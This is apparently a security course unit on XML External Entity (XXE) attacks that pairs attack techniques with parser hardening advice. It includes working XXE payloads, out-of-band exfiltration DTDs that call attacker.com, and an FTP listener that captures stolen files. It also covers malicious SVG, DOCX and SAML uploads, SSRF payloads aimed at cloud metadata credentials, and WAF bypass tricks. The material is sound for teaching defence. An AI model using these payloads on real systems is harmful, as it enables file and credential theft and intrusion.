# Unit 8: Injection Attacks — Topic 4: XXE Attacks (XML External Entity)

## Overview

**XML External Entity (XXE)** attacks exploit a feature of the XML specification that allows documents to define **entities** — variables that are expanded by the XML parser during processing. When an XML parser is configured to process **external entities**, an attacker can craft malicious XML that references local files, internal network resources, or external URLs, leading to **file disclosure**, **Server-Side Request Forgery (SSRF)**, **denial of service**, and in some cases **Remote Code Execution (RCE)**.

XXE consistently appears in major vulnerability lists: it was a dedicated category in **OWASP Top 10 2017 (A4)** and is now part of **A05:2021 – Security Misconfiguration**. Despite being well-documented, XXE remains prevalent because many XML parsers **enable external entity processing by default**, and developers often fail to explicitly disable this dangerous feature.

```
+----------+     Malicious XML      +----------------+     Entity Resolution     +------------------+
| Attacker | ---------------------> | XML Parser     | ------------------------> | File System /    |
|          |  <!ENTITY xxe          | (Processes DTD |     file:///etc/passwd    | Network / URL    |
|          |   SYSTEM               |  and resolves  |                           |                  |
|          |   "file:///etc/passwd"> |  entities)     |                           |                  |
+----------+                        +-------+--------+                           +--------+---------+
      ^                                     |                                             |
      |   HTTP Response containing          |     File contents returned                  |
      |   /etc/passwd contents              | <-------------------------------------------+
      +-------------------------------------+
```

---

## 1. XXE Fundamentals and Entity Types

### 1.1 XML Entities Explained

An **entity** in XML is a storage unit that can be referenced and expanded in the document. Entities are defined in the **Document Type Definition (DTD)**, which appears in the `<!DOCTYPE>` declaration.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY myEntity "This is the entity value">
]>
<root>&myEntity;</root>

<!-- After parsing, &myEntity; expands to: "This is the entity value" -->
```

### 1.2 Entity Type Classification

```
XML Entities
├── Internal Entities (defined inline in DTD)
│   ├── General Entities:   <!ENTITY name "value">
│   └── Parameter Entities: <!ENTITY % name "value">
│
└── External Entities (reference external resources)
    ├── General Entities:   <!ENTITY name SYSTEM "URI">
    │                       <!ENTITY name PUBLIC "pubId" "URI">
    └── Parameter Entities: <!ENTITY % name SYSTEM "URI">
                            <!ENTITY % name PUBLIC "pubId" "URI">
```

| Entity Type              | Syntax                                     | Scope               | Used In         |
|--------------------------|--------------------------------------------|----------------------|-----------------|
| **Internal General**     | `<!ENTITY foo "bar">`                      | Document body        | `&foo;`         |
| **External General**     | `<!ENTITY foo SYSTEM "file:///etc/passwd">`| Document body        | `&foo;`         |
| **Internal Parameter**   | `<!ENTITY % foo "bar">`                    | DTD only             | `%foo;`         |
| **External Parameter**   | `<!ENTITY % foo SYSTEM "http://evil.com">` | DTD only             | `%foo;`         |
| **Predefined**           | `&lt;`, `&gt;`, `&amp;`, `&apos;`, `&quot;` | Universal          | Built-in        |

### 1.3 Supported URI Schemes

External entities can reference various URI schemes depending on the parser and platform:

| URI Scheme        | Description                          | Example                                   | Platform        |
|-------------------|--------------------------------------|-------------------------------------------|-----------------|
| `file://`         | Local file access                    | `file:///etc/passwd`                      | All             |
| `http://`         | HTTP request                         | `http://evil.com/xxe`                     | All             |
| `https://`        | HTTPS request                        | `https://evil.com/xxe`                    | All             |
| `ftp://`          | FTP request                          | `ftp://evil.com/xxe`                      | Java, PHP       |
| `php://`          | PHP stream wrapper                   | `php://filter/convert.base64-encode/resource=index.php` | PHP |
| `jar://`          | Java JAR file access                 | `jar:http://evil.com/evil.jar!/file.txt`  | Java            |
| `netdoc://`       | Java network document                | `netdoc:///etc/passwd`                    | Java (older)    |
| `gopher://`       | Gopher protocol                      | `gopher://evil.com:25/...`                | PHP (older), Java |
| `expect://`       | PHP expect wrapper (RCE)             | `expect://id`                             | PHP (with ext)  |
| `data://`         | Data URI                             | `data://text/plain;base64,SGVsbG8=`       | PHP             |
| `dict://`         | DICT protocol                        | `dict://evil.com:port/command`            | libxml2         |

### 1.4 Basic XXE Attack Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">     <!--  Define external entity -->
]>
<root>
  <data>&xxe;</data>                              <!--  Reference entity (triggers resolution) -->
</root>
```

```
Parser Processing Steps:

1. Parse XML declaration
2. Parse DOCTYPE — find entity definition
3. Encounter &xxe; reference in document body
4. Resolve entity: read file:///etc/passwd
5. Replace &xxe; with file contents
6. Return parsed document (with file contents embedded)

+-----------------------------------------------------------+
| Input XML:                                                 |
|   <!ENTITY xxe SYSTEM "file:///etc/passwd">                |
|   <data>&xxe;</data>                                       |
+-----------------------------------------------------------+
                          |
                          v
+-----------------------------------------------------------+
| Parser resolves entity:                                    |
|   &xxe; --> reads /etc/passwd --> replaces in document     |
+-----------------------------------------------------------+
                          |
                          v
+-----------------------------------------------------------+
| Output:                                                    |
|   <data>root:x:0:0:root:/root:/bin/bash                   |
|   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin          |
|   ...</data>                                                |
+-----------------------------------------------------------+
```

---

## 2. File Disclosure via XXE

### 2.1 Classic File Read

The most common XXE exploitation: reading local files from the server.

**Vulnerable Application (PHP):**
```php
<?php
// Application accepts XML input (e.g., for data import)
$xml_input = file_get_contents('php://input');
$doc = simplexml_load_string($xml_input);
echo "Name: " . $doc->name;
echo "Email: " . $doc->email;
?>
```

**Attack — Read /etc/passwd:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
```

**Response:**
```
Name: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### 2.2 Reading Source Code

Source code files often contain XML special characters (`<`, `>`, `&`) that break entity expansion. Use **PHP filter wrappers** or **CDATA wrapping** to handle this.

**PHP filter (base64 encoding):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
```

**Response (base64-encoded source code):**
```
Name: PD9waHAKJHhtbF9pbnB1dCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwo...
```

```bash
# Decode on attacker's machine
echo "PD9waHAK..." | base64 -d
# Outputs the PHP source code
```

### 2.3 Common Files to Target

| File Path (Linux)                  | Contents                                       |
|------------------------------------|-------------------------------------------------|
| `/etc/passwd`                      | User accounts                                   |
| `/etc/shadow`                      | Password hashes (requires root)                 |
| `/etc/hostname`                    | Server hostname                                 |
| `/etc/hosts`                       | Host file entries                                |
| `/etc/nginx/nginx.conf`           | Nginx configuration                              |
| `/etc/apache2/apache2.conf`       | Apache configuration                             |
| `/var/www/html/index.php`          | Web application source code                      |
| `/var/www/html/.env`               | Environment variables (DB creds, API keys)       |
| `/home/user/.ssh/id_rsa`          | SSH private key                                  |
| `/home/user/.bash_history`        | Command history                                  |
| `/proc/self/environ`              | Process environment variables                    |
| `/proc/self/cmdline`              | Process command line                             |
| `/proc/net/tcp`                   | Active TCP connections                           |

| File Path (Windows)                | Contents                                       |
|------------------------------------|-------------------------------------------------|
| `C:\Windows\System32\drivers\etc\hosts` | Host file                                 |
| `C:\Windows\win.ini`              | Windows configuration                            |
| `C:\inetpub\wwwroot\web.config`   | IIS/ASP.NET configuration                        |
| `C:\Users\Administrator\.ssh\id_rsa` | SSH private key                               |

### 2.4 Directory Listing (Java-specific)

Java's XML parser can list directories using the `file://` protocol:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/">
]>
<data>&xxe;</data>
```

On some Java parsers, this returns a directory listing rather than an error.

---

## 3. Blind XXE with Out-of-Band Exfiltration

### 3.1 Understanding Blind XXE

In many real-world scenarios, the application does not reflect entity content in the response. This is **blind XXE** — the entity is resolved by the parser, but the attacker cannot see the result directly.

```
Classic (In-Band) XXE:              Blind (Out-of-Band) XXE:

+----------+    XXE    +-------+    +----------+    XXE    +-------+
| Attacker | --------> | App   |    | Attacker | --------> | App   |
+----------+           +---+---+    +----------+           +---+---+
     ^                     |              ^                     |
     |  File contents in   |              |  Generic response   |
     |  HTTP response      |              |  (no data)          |
     +---------------------+              +---------------------+
                                          
                                    BUT: Parser still resolves
                                    the entity and can make
                                    outbound requests!
```

### 3.2 OOB Exfiltration via Parameter Entities

The key technique for blind XXE uses **parameter entities** (`%`) to chain entity definitions and force the parser to send data to an attacker-controlled server.

**Step 1: Attacker hosts a malicious DTD on their server:**

```
File: http://attacker.com/evil.dtd

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Attacker sends XXE payload referencing the external DTD:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>anything</data>
```

**Step 3: Parser processing flow:**

```
1. Parser fetches http://attacker.com/evil.dtd
2. evil.dtd defines %file; = contents of /etc/hostname
3. evil.dtd defines %eval; = entity declaration containing %file;
4. %eval; is expanded, creating %exfil; entity
5. %exfil; triggers HTTP request to:
   http://attacker.com/collect?data=webserver01
6. Attacker reads "webserver01" from their server logs

+-----------+                    +------------------+                    +------------------+
| Attacker  | --- XXE payload -> | Target Server    | --- fetch DTD ---> | Attacker's       |
| (sends    |                    | (XML parser      |                    | Server           |
|  payload) |                    |  processes DTD)  |                    | (evil.dtd)       |
+-----------+                    +--------+---------+                    +--------+---------+
      ^                                  |                                        |
      |                                  | Reads /etc/hostname = "webserver01"     |
      |                                  |                                        |
      |                                  | HTTP GET to attacker.com/collect?      |
      |                                  |   data=webserver01                     |
      |                                  +--------------------------------------->|
      |                                                                           |
      |  Server log: GET /collect?data=webserver01                                |
      +<--------------------------------------------------------------------------+
```

### 3.3 DNS-Based Blind XXE

If HTTP outbound is blocked, use DNS exfiltration:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>anything</data>
```

**evil.dtd:**
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

```
DNS query observed: webserver01.attacker.com
                     ^^^^^^^^^^^^
                     Exfiltrated data appears as subdomain
```

### 3.4 FTP-Based Exfiltration (Multi-Line Data)

HTTP and DNS exfiltration fails for multi-line files (like `/etc/passwd`). Use **FTP** to exfiltrate multi-line data:

**evil.dtd:**
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%exfil;
```

**Attacker — Run a malicious FTP server:**
```python
#!/usr/bin/env python3
"""Simple FTP server for XXE data exfiltration"""

import socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 2121))
server.listen(1)
print("[*] FTP server listening on port 2121...")

while True:
    conn, addr = server.accept()
    print(f"[+] Connection from {addr}")
    conn.send(b"220 Welcome\r\n")
    
    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        print(f"[+] Received: {data.strip()}")
        
        if data.startswith("USER"):
            conn.send(b"331 OK\r\n")
        elif data.startswith("PASS"):
            conn.send(b"230 OK\r\n")
        elif data.startswith("TYPE"):
            conn.send(b"200 OK\r\n")
        elif data.startswith("CWD") or data.startswith("RETR"):
            # The file contents appear as the path!
            print(f"[+] EXFILTRATED DATA:\n{data}")
            conn.send(b"550 Not found\r\n")
        elif data.startswith("QUIT"):
            conn.send(b"221 Bye\r\n")
            break
        else:
            conn.send(b"200 OK\r\n")
    
    conn.close()
```

### 3.5 Blind XXE via Error Messages

Some parsers include entity content in error messages. Force an error that leaks the file content:

**evil.dtd:**
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Error message returned:**
```
java.io.FileNotFoundException: /nonexistent/webserver01
                                             ^^^^^^^^^^^
                                             File content leaked in error!
```

---

## 4. XXE via File Upload (SVG, DOCX, etc.)

### 4.1 XXE in Unexpected File Formats

Many file formats are XML-based internally. If an application accepts these file uploads and processes the XML, XXE attacks are possible even when the application doesn't explicitly accept XML input.

```
XML-Based File Formats:

+------------------+------------------------------------------+
| Format           | Internal XML Files                       |
+------------------+------------------------------------------+
| SVG              | The SVG file IS XML                      |
| DOCX (Word)      | word/document.xml, [Content_Types].xml   |
| XLSX (Excel)     | xl/worksheets/sheet1.xml                 |
| PPTX (PowerPoint)| ppt/slides/slide1.xml                    |
| PDF (some)       | XMP metadata may contain XML             |
| XHTML            | XHTML IS XML                             |
| RSS/Atom         | Feed formats are XML                     |
| SOAP             | SOAP messages are XML                    |
| SAML             | SAML assertions are XML                  |
| GPX              | GPS data in XML                          |
| KML              | Google Earth data in XML                 |
+------------------+------------------------------------------+
```

### 4.2 XXE via SVG File Upload

SVG (Scalable Vector Graphics) files are XML documents. If a web application processes uploaded SVG files (e.g., avatar upload, image converter), XXE is possible.

**Malicious SVG — Read /etc/passwd:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20" font-size="14">&xxe;</text>
</svg>
```

If the application renders the SVG or returns its content, `/etc/passwd` appears in the image text.

**Blind XXE via SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40"/>
</svg>
```

### 4.3 XXE via DOCX File Upload

DOCX files are ZIP archives containing XML files. An attacker can modify the internal XML to include XXE payloads.

**Step-by-Step DOCX XXE:**

```bash
# Step 1: Create a normal DOCX file (or use any existing one)
# Step 2: Unzip the DOCX
mkdir docx_extracted
cd docx_extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml or [Content_Types].xml
# Edit [Content_Types].xml:
```

**Modified [Content_Types].xml:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <!-- Add entity reference somewhere -->
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml &xxe;"/>
  <!-- ... rest of content types ... -->
</Types>
```

```bash
# Step 4: Repackage as DOCX
zip -r ../malicious.docx .

# Step 5: Upload malicious.docx to target application
# If the server parses the XML inside the DOCX, XXE fires
```

### 4.4 XXE via XLSX File Upload

```bash
# Unzip XLSX
unzip spreadsheet.xlsx -d xlsx_extracted
cd xlsx_extracted

# Edit xl/worksheets/sheet1.xml to include XXE
# Or edit [Content_Types].xml
```

**Modified xl/worksheets/sheet1.xml:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="str"><v>&xxe;</v></c>
    </row>
  </sheetData>
</worksheet>
```

```bash
# Repackage
zip -r ../malicious.xlsx .
```

### 4.5 XXE via SAML Authentication

SAML (Security Assertion Markup Language) uses XML for authentication tokens. If the SAML parser processes DTDs, XXE is possible in the authentication flow.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                     ID="&xxe;"
                     Version="2.0">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    &xxe;
  </saml:Issuer>
</samlp:AuthnRequest>
```

---

## 5. SSRF via XXE

### 5.1 Using XXE for Server-Side Request Forgery

XXE naturally enables SSRF because the XML parser makes outbound requests on behalf of the server when resolving external entities.

```
+----------+    XXE Payload     +----------------+    Entity Resolution    +-------------------+
| Attacker | -----------------> | Target Server  | ----------------------> | Internal Service  |
| (External|                    | (XML Parser)   |    http://169.254.      | (AWS Metadata /   |
|  Network)|                    |                |    169.254/latest/      |  Internal API /   |
+----------+                    +-------+--------+    meta-data/           |  Admin Panel)     |
      ^                                 |                                  +-------------------+
      |    Response containing          |    Internal service responds           |
      |    internal service data        | <-------------------------------------+
      +---------------------------------+
```

### 5.2 SSRF Targets

```xml
<!-- AWS Metadata Service (IMDSv1) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>

<!-- AWS IAM Credentials -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME">

<!-- AWS User Data (may contain secrets) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">

<!-- Google Cloud Metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure Metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">

<!-- Internal Services -->
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://10.0.0.1:3306/">
<!ENTITY xxe SYSTEM "http://192.168.1.1/management">
```

### 5.3 Port Scanning via XXE

Use XXE to scan internal ports by observing response timing and errors:

```xml
<!-- Scan port 22 (SSH) on internal host -->
<!ENTITY xxe SYSTEM "http://10.0.0.5:22/">

<!-- Scan port 3306 (MySQL) -->
<!ENTITY xxe SYSTEM "http://10.0.0.5:3306/">

<!-- Scan port 6379 (Redis) -->
<!ENTITY xxe SYSTEM "http://10.0.0.5:6379/">
```

```
Port Scanning Logic:

Open Port:
  - Connection established
  - May return banner or error data
  - Response time: Fast

Closed Port:
  - Connection refused
  - Error message: "Connection refused"
  - Response time: Fast

Filtered Port:
  - Connection times out
  - Response time: Slow (timeout)
  
+--------+------+------+------+------+------+------+------+
| Host   | 22   | 80   | 443  | 3306 | 5432 | 6379 | 8080 |
+--------+------+------+------+------+------+------+------+
| 10.0.0.5| Open | Open |Closed| Open |Closed| Open |Closed|
+--------+------+------+------+------+------+------+------+
```

### 5.4 SSRF-to-RCE Chains via XXE

```
XXE -> SSRF -> Internal Service Exploitation

Example chains:
1. XXE -> SSRF -> AWS Metadata -> IAM Credentials -> AWS Account Takeover
2. XXE -> SSRF -> Redis (port 6379) -> Write to crontab -> RCE
3. XXE -> SSRF -> Internal Admin Panel -> Create admin account -> Full access
4. XXE -> SSRF -> Docker API (port 2375) -> Container escape -> RCE
5. XXE -> SSRF -> Kubernetes API -> Pod creation -> RCE
```

---

## 6. XXE in Different Parsers (Java, PHP, Python, .NET)

### 6.1 Java XML Parsers

Java XML parsers are historically the **most vulnerable** to XXE because most enable external entity processing by default.

| Java Parser                    | XXE Default | Vulnerable Methods                                |
|-------------------------------|-------------|---------------------------------------------------|
| `DocumentBuilderFactory`       | Enabled     | `parse()`, `newDocumentBuilder().parse()`         |
| `SAXParserFactory`            | Enabled     | `newSAXParser().parse()`                          |
| `XMLInputFactory` (StAX)      | Enabled     | `createXMLStreamReader()`                         |
| `TransformerFactory`          | Enabled     | `newTransformer()`                                |
| `SchemaFactory`               | Enabled     | `newSchema()`                                     |
| `Validator`                   | Enabled     | `validate()`                                      |
| `XMLReader` (SAX)             | Enabled     | `parse()`                                         |
| `JAXBContext` (Unmarshaller)  | Enabled     | `unmarshal()`                                     |

**Java — Vulnerable:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
// XXE is processed — file:// entities are resolved!
```

**Java — Secure:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable DTDs entirely (strongest protection)
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Or disable external entities specifically
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

### 6.2 PHP XML Parsers

| PHP Function/Class          | XXE Default (PHP < 8.0) | XXE Default (PHP ≥ 8.0) |
|-----------------------------|--------------------------|--------------------------|
| `simplexml_load_string()`   | Enabled                  | Disabled                 |
| `simplexml_load_file()`     | Enabled                  | Disabled                 |
| `DOMDocument::loadXML()`    | Enabled                  | Disabled                 |
| `XMLReader`                 | Enabled                  | Disabled                 |
| `xml_parse()` (expat)       | Not vulnerable           | Not vulnerable           |

**PHP — Vulnerable (< 8.0):**
```php
<?php
$xml = simplexml_load_string($user_input);
// External entities are processed!
?>
```

**PHP — Secure:**
```php
<?php
// Disable external entity loading (PHP < 8.0)
libxml_disable_entity_loader(true);

// Or use LIBXML_NOENT flag (but this ENABLES substitution — avoid it!)
// Correct: do NOT pass LIBXML_NOENT
$xml = simplexml_load_string($user_input, 'SimpleXMLElement', LIBXML_NONET);
// LIBXML_NONET prevents network access during parsing
?>
```

### 6.3 Python XML Parsers

| Python Library              | XXE Vulnerable | Notes                                      |
|-----------------------------|----------------|--------------------------------------------|
| `xml.etree.ElementTree`     | No*            | Ignores DTDs (but limited XML support)     |
| `xml.dom.minidom`           | No*            | Ignores external entities                   |
| `xml.sax`                   | Yes            | Processes external entities                 |
| `lxml.etree`                | Yes            | Processes external entities by default      |
| `xml.dom.pulldom`           | Yes            | Processes external entities                 |
| `defusedxml`                | No (safe)      | Designed specifically to prevent XXE        |

`*` — Safe against XXE but may be vulnerable to Billion Laughs

**Python — Vulnerable (lxml):**
```python
from lxml import etree
doc = etree.fromstring(user_input)  # XXE is processed!
```

**Python — Secure (defusedxml):**
```python
import defusedxml.ElementTree as ET

# Raises an exception if DTD, entities, or external references detected
doc = ET.fromstring(user_input)  # Safe!
```

**Python — Secure (lxml with restrictions):**
```python
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,    # Don't resolve entities
    no_network=True,           # No network access
    dtd_validation=False,      # Don't validate DTD
    load_dtd=False             # Don't load external DTD
)
doc = etree.fromstring(user_input, parser=parser)
```

### 6.4 .NET XML Parsers

| .NET Class                  | XXE Default (.NET < 4.5.2) | XXE Default (.NET ≥ 4.5.2) |
|-----------------------------|-----------------------------|-----------------------------|
| `XmlDocument`               | Enabled                     | Disabled                    |
| `XmlTextReader`             | Enabled                     | Disabled                    |
| `XmlReader.Create()`        | Disabled                    | Disabled                    |
| `XPathNavigator`            | Enabled                     | Disabled                    |
| `XslCompiledTransform`      | Enabled                     | Disabled                    |

**C# — Vulnerable (.NET < 4.5.2):**
```csharp
XmlDocument doc = new XmlDocument();
doc.LoadXml(userInput);  // XXE processed!
```

**C# — Secure:**
```csharp
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // Disable external entity resolution
doc.LoadXml(userInput);

// Or use XmlReader with secure settings
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // Disallow DTDs
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(new StringReader(userInput), settings);
```

### 6.5 Parser Security Comparison

```
Parser Security Matrix:

                    DTD     External   Parameter   Billion
Parser              Proc.   Entities   Entities    Laughs    Default
+-----------------+-------+----------+-----------+---------+---------+
| Java DOM/SAX    | Yes   | Yes      | Yes       | Yes     | UNSAFE  |
| PHP simplexml   | Yes   | Yes*     | Yes*      | Yes*    | MIXED** |
| Python lxml     | Yes   | Yes      | Yes       | Yes     | UNSAFE  |
| Python etree    | No    | No       | No        | Yes†    | SAFE-ish|
| .NET XmlDoc     | Yes   | No***    | No***     | No***   | SAFE*** |
| defusedxml      | Block | Block    | Block     | Block   | SAFE    |
+-----------------+-------+----------+-----------+---------+---------+

 *  PHP < 8.0 only     ** PHP >= 8.0 disabled by default
 ** Depends on version  *** .NET >= 4.5.2
 †  Vulnerable to entity expansion DoS without limits
```

---

## 7. Prevention and Parser Configuration

### 7.1 Universal Prevention Rules

```
+-----------------------------------------------------------------------+
|                    XXE Prevention Hierarchy                             |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 1: DISABLE DTD PROCESSING ENTIRELY                           | |
|  |   This is the strongest and most reliable defense.                 | |
|  |   If DTDs are disabled, no entity attacks are possible.           | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 2: If DTDs are required, disable EXTERNAL entities           | |
|  |   Disable both external general and parameter entities.           | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 3: Use safe-by-default libraries                             | |
|  |   Python: defusedxml                                               | |
|  |   PHP >= 8.0: safe by default                                      | |
|  |   .NET >= 4.5.2: safe by default                                   | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 4: Validate and sanitize XML input                           | |
|  |   Reject input containing <!DOCTYPE, <!ENTITY, SYSTEM, PUBLIC     | |
|  +-------------------------------------------------------------------+ |
|                                                                         |
|  +-------------------------------------------------------------------+ |
|  | Rule 5: Use JSON instead of XML where possible                    | |
|  +-------------------------------------------------------------------+ |
+-----------------------------------------------------------------------+
```

### 7.2 Parser-Specific Secure Configurations

**Complete Java Secure Configuration:**
```java
// DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// SAXParserFactory
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// XMLInputFactory (StAX)
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);

// TransformerFactory
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

// SchemaFactory
SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

// JAXBContext Unmarshaller
SAXParserFactory spf2 = SAXParserFactory.newInstance();
spf2.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
Source xmlSource = new SAXSource(spf2.newSAXParser().getXMLReader(),
                                new InputSource(new StringReader(xmlInput)));
Object result = unmarshaller.unmarshal(xmlSource);
```

### 7.3 Testing Tools for XXE

| Tool                    | Type               | Description                                              |
|-------------------------|--------------------|----------------------------------------------------------|
| **Burp Suite**          | Proxy/Scanner      | Active scanning detects XXE; manual testing via Repeater  |
| **OWASP ZAP**           | Proxy/Scanner      | Active XXE detection                                     |
| **XXEinjector**         | Dedicated XXE tool | Automated XXE exploitation (OOB, error-based, etc.)      |
| **dtd-finder**          | Enumeration        | Finds local DTD files for error-based XXE                |
| **Burp Collaborator**   | OOB detection      | Confirms blind XXE via DNS/HTTP callbacks                |
| **Interactsh**          | OOB detection      | Open-source alternative to Burp Collaborator             |

**XXEinjector Usage:**
```bash
# Basic file read
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --httpport=8080 --oob=http --phpfilter

# Blind OOB exfiltration
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --httpport=8080 --oob=http

# Using Burp Collaborator for OOB
# 1. Generate Collaborator payload
# 2. Use as external DTD host in XXE payload
# 3. Check Collaborator tab for interactions
```

### 7.4 Web Application Firewall (WAF) Bypass Techniques

| WAF Rule                         | Bypass Technique                                              |
|----------------------------------|---------------------------------------------------------------|
| Blocks `<!DOCTYPE`               | Use encoding: UTF-7, UTF-16; or mixed case `<!DoCtYpE`       |
| Blocks `<!ENTITY`                | Use parameter entities in external DTD (not in request body)  |
| Blocks `SYSTEM`                  | Use `PUBLIC` instead: `<!ENTITY foo PUBLIC "x" "file://...">`|
| Blocks `file://`                 | Use alternative schemes: `netdoc://`, `jar://`, `php://`      |
| Content-Type validation          | Try alternative content types: `text/xml`, `application/xml`  |
| Blocks DTD keywords              | Use character encoding: `&#x53;YSTEM` (hex encoding)         |
| Input length limit               | Host DTD externally; payload in request is minimal            |

---

## Summary Table

| Concept                     | Key Points                                                                                      |
|-----------------------------|-------------------------------------------------------------------------------------------------|
| **What is XXE**             | Exploiting XML external entity processing to read files, make requests, or cause DoS            |
| **Entity Types**            | Internal/External × General/Parameter; external entities are the attack vector                   |
